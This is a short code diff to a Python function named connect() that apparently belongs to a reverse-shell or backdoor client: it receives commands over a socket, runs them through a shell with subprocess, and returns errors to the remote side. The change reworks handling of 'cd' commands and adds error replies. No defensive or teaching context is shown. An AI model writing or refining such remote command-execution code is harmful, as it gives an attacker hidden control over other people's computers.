@@ -43,10 +43,11 @@ def connect():
 			except Exception as e:
 				s.send ( str(e) ) # send the exception error
 				pass
-		elif command.split(' ')[0] == 'cd':
-			os.chdir(
-				command.split(' ')[1]
-			)
+		elif command[:2] == 'cd':
+			try:
+				os.chdir(command.strip('\r\n')[3:])
+			except:
+				s.send('[ERROR] The system path cannot be found.'.encode())
 		else:
 			try:
 				CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
